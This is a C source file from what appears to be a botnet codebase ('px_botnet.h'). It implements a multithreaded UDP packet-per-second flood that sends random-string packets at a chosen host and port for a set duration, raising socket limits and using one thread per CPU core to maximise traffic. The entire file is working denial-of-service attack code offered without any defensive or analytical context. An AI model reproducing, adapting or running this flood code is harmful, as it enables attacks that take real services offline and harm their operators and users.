#include "../../includes/px_botnet.h"
#define MAX_CHARS 70
#define TIME_UPDATE_INTERVAL 1000
#define NUM_MSGS 100
#define RAND_STR_COUNT 10000  // Amount of pre-generated random strings.

struct arginfo {
    unsigned char *host;
    int port, seconds, power, packet_size, sock;
};

unsigned long lcg_rand(unsigned long a) {
    return (a * 279470273UL) % 4294967291UL;
}

void zrand_string(char *string, int len, unsigned long seed) {
    const char zchars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()";
    const unsigned int char_len = sizeof(zchars) - 1;
    unsigned long r = seed;
    int i;
    for (i = 0; i < len; i++) {
        r = lcg_rand(r);
        string[i] = zchars[r % char_len];
    }
    string[len] = '\0';
}

char rand_strings[RAND_STR_COUNT][MAX_CHARS];

void generate_rand_strings(int count, int len) {
    int i;
    for (i = 0; i < count; i++) {
        zrand_string(rand_strings[i], len, time(NULL) ^ i);
    }
}

void *thread_func(void *args) {
    struct arginfo *args_ptr = (struct arginfo *)args;

    srand(time(NULL) ^ (long)pthread_self());
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(args_ptr->port);
    addr.sin_addr.s_addr = inet_addr(args_ptr->host);

    char packet[MAX_CHARS];

    time_t start_time = time(NULL);
    time_t end_time = start_time + args_ptr->seconds;
    time_t current_time = start_time;
    int count = 0;

    int i;
    while (current_time < end_time) {
        for (i = 0; i < NUM_MSGS; i++) {
            int sock = args_ptr->sock;
            if (sock != -1) {
                int sent_bytes = sendto(sock, rand_strings[i % RAND_STR_COUNT], args_ptr->packet_size, 0, (struct sockaddr *)&addr, sizeof(addr));
                if (sent_bytes == -1) {
                    perror("sendto");
                    break;
                }
            }
        }

        if (++count % TIME_UPDATE_INTERVAL == 0) {
            current_time = time(NULL);
        }
    }

    pthread_exit(NULL);
}

int pthread_setaffinity_np(pthread_t thread, size_t cpusetsize, const cpu_set_t *cpuset) {
    return -1;
}

void UDP_PPS(unsigned char *host, int port, int seconds, int packet_size) {
    long nprocs = sysconf(_SC_NPROCESSORS_ONLN);
    if (nprocs < 1) {
        nprocs = 1;
    }
    int power = nprocs;
    pthread_t threads[power];
    struct arginfo args[power];

    generate_rand_strings(RAND_STR_COUNT, packet_size);

    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);

    rl.rlim_cur = 4096;  // New soft limit
    rl.rlim_max = 4096;  // New hard limit

    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        perror("setrlimit");
        exit(EXIT_FAILURE);
    }

    int i;
    for (i = 0; i < power; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == -1) {
            perror("socket");
            exit(EXIT_FAILURE);
        }

        int optval = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
#ifdef SO_REUSEPORT
        setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &optval, sizeof(optval));
#endif

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        args[i].host = host;
        args[i].port = port;
        args[i].seconds = seconds;
        args[i].power = power;
        args[i].packet_size = packet_size;
        args[i].sock = sock;

        if (pthread_create(&threads[i], NULL, thread_func, &args[i]) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }

        // Set thread affinity to different CPU cores if available
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(i % power, &cpuset);
        pthread_setaffinity_np(threads[i], sizeof(cpu_set_t), &cpuset);
    }

    for (i = 0; i < power; i++) {
        pthread_join(threads[i], NULL);
        close(args[i].sock);
    }
}